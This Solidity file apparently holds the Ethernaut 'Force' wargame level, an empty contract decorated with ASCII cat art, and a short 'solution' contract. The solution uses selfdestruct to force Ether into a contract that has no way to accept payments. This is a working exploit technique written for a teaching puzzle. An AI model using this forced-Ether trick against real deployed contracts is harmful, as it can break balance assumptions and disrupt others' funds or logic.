// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


// solution
contract Attack {
  uint256 balances;
  address owner;

  constructor() payable {
    balances = msg.value;
    owner = msg.sender;
  }

  modifier onlyOwner(){
    require(msg.sender == owner, "Only owner can destroy contract");
    _;
  }
  function destruct(address _address) public onlyOwner payable{
    selfdestruct(payable(_address));
  }
  
}
